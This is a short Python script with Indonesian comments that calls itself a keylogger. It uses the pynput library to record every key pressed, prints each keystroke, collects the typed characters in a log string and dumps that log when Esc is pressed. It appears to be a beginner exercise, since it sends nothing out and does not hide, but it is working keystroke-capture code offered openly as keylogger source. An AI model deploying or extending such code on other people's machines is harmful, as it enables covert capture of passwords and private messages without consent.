# library untuk keyllogger
from pynput import keyboard

# bikin listener untuk deteksi ketika press dan release key

LOG = ""


def on_press(key):
    global LOG
    # alphabetical : key.char
    # special char : key
    try:
        print(f"alphabetical key {key.char} is pressed")
        LOG += key.char
    except:
        print(f"special key {key} is pressed")


def on_release(key):
    try:
        print(f"alphabetical key {key.char} is pressed")
    except:
        print(f"special key {key} is pressed")

        if key == keyboard.Key.esc:
            print(LOG)
            print("exit the program")
            return False


def main():
    # parameternya ada 2 on press dan on release
    listener = keyboard.Listener(on_press, on_release)
    listener.start()
    listener.join()
    pass


if __name__ == "__main__":
    main()
